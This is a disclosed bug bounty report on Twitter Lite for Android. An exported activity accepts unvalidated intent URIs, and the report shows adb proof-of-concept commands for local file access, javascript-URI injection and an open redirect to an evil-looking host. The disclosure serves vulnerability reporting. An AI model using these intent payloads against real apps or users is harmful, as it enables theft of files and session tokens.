# Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect 

## Report Details
- **Report ID**: 499348
- **URL**: https://hackerone.com/reports/499348
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-02-21T16:14:32.124Z
- **Disclosed**: 2019-04-29T16:17:02.180Z

## Reporter
- **Username**: rahulkankrale
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due to which this activity vulnerable to steal users local files, javascript injection and open redirect.

**Description:** com.twitter.android.lite.TwitterLiteActivity is set to exported so external app can communicate with it.
As this activity doesn't validate data pass through intent critical uri like javascript and file so malicious app can steal users files as well as inject javascript.
It can leads to many issue like UXSS, Token steal, etc.

## Steps To Reproduce:

  1. To reproduce we use ADB tool

  2. To reproduce local file access use: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"

  3. To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

  4. To reproduce open redirect: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"

 * Video of POC attached.

Thanks

## Impact

As critical uri like javascript & file is not being validate malicious app can steal users session token, users files etc.

## Attachments
- Screenrecorder-2019-02-21-21-41-11-973.mp4
